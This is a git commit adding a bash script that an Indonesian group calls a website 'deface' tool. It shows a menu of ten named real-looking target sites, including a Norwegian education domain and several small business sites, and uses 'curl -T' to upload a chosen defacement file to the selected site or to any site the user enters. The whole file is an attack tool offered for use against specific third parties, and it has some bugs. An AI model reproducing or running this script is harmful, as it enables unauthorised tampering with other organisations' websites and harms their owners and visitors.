a9b8831cd7c17ed0cbbc9e4ed5315ab4860c757e
insomniacyberteam <45147248+insomniacyberteam@users.noreply.github.com>
2018-11-24 12:42:32 +0700

    Add files via upload

---
+++ insomdepes.sh
@@ -0,0 +1,223 @@
+9#!/system/xbin/bash
+
+#LiatApaAsu
+#AuthorCodingSusah²lutinggalrecode
+#lugamikirapasusahnyacoding
+#dasarscriptkiddie
+#CodeByCyberTron
+
+# Bersihkan Layar
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+###################################################
+# CTRL C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo  $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
+sleep 1
+echo ""
+echo  $yellow"[#]> Thank You For Using My Tools ... "
+sleep 1
+echo ""
+echo  $white"[#]> Insomnia Cyber Team Was Here ... "
+read enter
+exit
+}
+
+echo $white"_____________________TOOLS DEFACE___________________"
+echo $white"|Author : CyberTron                                |"
+echo $white"|Tools Tipe : DEFACE                               |"
+echo $white"|Contact Me : insomcyberteam@gmail.com             |"
+echo $white"|Team : INSOMNIA CYBER TEAM                        |"
+echo $white"|Thanks To : Zakaria96-Legion-Roy77-All Member ICT |"
+echo $white"|Creation Date : 24-11-2018                        |"
+echo $white"|Follow IG Kami : @insomncyberteam                 |"
+echo $white"|__________________________________________________|"
+date
+echo $red"Di Atas Jam Mhank"
+echo $white"TERIMAKASIH YA KIMAK SUDAH MENGGUNAKAN TOOLS INI"
+echo""
+echo $red"PILIH WEB YANG MAU DI DEFACE YA KIMAK"
+echo $white"1->http://bestilling.udir.no/"
+echo $white"2->http://Matrimony.co.za/"
+echo $white"3->http://Pjdelmont.co.za/"
+echo $white"4->http://office.ratiss.org/"
+echo $white"5->http://tirupurjobs.net/"
+echo $white"6->http://50-50-50.ru/"
+echo $white"7->http://560560.ru/"
+echo $white"8->http://Bheh.Co.za/"
+echo $white"9->http://orders.southeasternfood.com/"
+echo $white"10->http://myownemailer.com/"
+echo $white"11->Punya Target?"
+echo $white"12->Keluar"
+echo $white"Note : TARUH SCRIPTNYA JANGAN DI DALEM FOLDER YA KIMAK!!!"
+read -p "[INSOMNIA>" bro;
+
+if [ $bro = 1 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "Scriptnya Kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://bestilling.udir.no/
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://bestilling.udir.no/$script"
+exit
+fi
+
+if [ $bro = 2 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "Scriptnya Kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://Matrimony.co.za/
+echo $white "SELESAI KIMAK"
+echo $white"Cek = http://Matrimony.co.za/$script"
+exit
+fi
+
+if [ $bro = 3 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "Scriptnya Kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://Pjdelmont.co.za/
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://Pjdelmont.co.za/$script"
+exit
+fi
+
+if [ $bro = 4 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "scriptnya kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://office.ratiss.org/
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://office.ratiss.org/$script"
+exit
+fi
+
+if [ $bro = 5 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "scriptnya kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://tirupurjobs.net
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://tirupurjobs.net/$script"
+exit
+fi
+
+if [ $bro = 6 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "scriptnya kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://50-50-50.ru
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://50-50-50.ru/$script"
+exit
+fi
+
+if [ $bro = 7 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "scriptnya kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://560560.ru
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://560560.ru/$script"
+exit
+fi
+
+if [ $act = 8 ]
+then
+clear
+echo -n "Masukan Nama Script Deface"
+echo $white"scriptnya kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://Bheh.Co.za
+echo $white"SELESAI YA KIMAK"
+echo $white"Cek = http://Bheh.Co.za/$script"
+exit
+fi
+
+if [ $bro = 9 ]
+then
+clear
+echo -n "Masukan Nama Script Deface"
+echo $white"scriptnya kimak : "
+read script ;
+echo $white"TUNGGU KIMAK"
+curl -T /storage/emulated/0/$script http://orders.southeasternfood.com
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://orders.southeasternfood.com/$script"
+exit
+fi
+
+if [ $bro = 10 ]
+then
+clear
+echo $white"Masukan Nama Script Deface"
+echo -n "scriptnya kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script http://myownemailer.com
+echo $white"SELESAI KIMAK"
+echo $white"Cek = http://myownemailer.com/$script"
+exit
+fi
+
+if [ $bro = 11 ]
+then
+clear
+echo $white"Masukan Website Target"
+echo $white"Website : "
+read website ;
+echo $white" Masukan Nama Script"
+echo -n "Scriptnya Kimak : "
+read script ;
+echo $white"TUNGGU ASU"
+curl -T /storage/emulated/0/$script $website
+exit
+fi
+
+if [ $bro = 12 ]
+then
+clear
+echo $white"THANKS UDH PAKAI TOOLS INI"
+sleep 2
+echo $white"KALO ADA SALAH KATA MAAPIN YA KIMAK"
+sleep 2
+echo $white"THANKS TO"
+sleep 2
+echo $white"ALL MEMBER INSOMNIA CYBER TEAM"
+sleep 2
+echo $white"SAMPAI JUMPA KIMAK"
+sleep 2
+exit
+fi
